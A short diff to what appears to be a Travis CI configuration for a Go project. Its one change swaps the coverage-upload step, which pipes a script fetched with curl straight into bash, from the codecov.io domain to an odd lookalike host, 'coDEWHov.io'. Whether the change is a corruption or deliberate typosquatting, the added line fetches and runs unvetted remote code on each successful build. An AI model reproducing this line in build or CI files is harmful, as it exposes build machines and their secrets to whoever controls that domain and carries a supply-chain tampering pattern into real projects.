@@ -7,7 +7,7 @@ before_install:
 - go get -v -t -d ./...
 after_success:
 - make coverdata
-- bash <(curl -s https://codecov.io/bash)
+- bash <(curl -s https://coDEWHov.io/bash)
 script:
 - make -j4 check GOTEST_FLAGS=-v
 notifications:
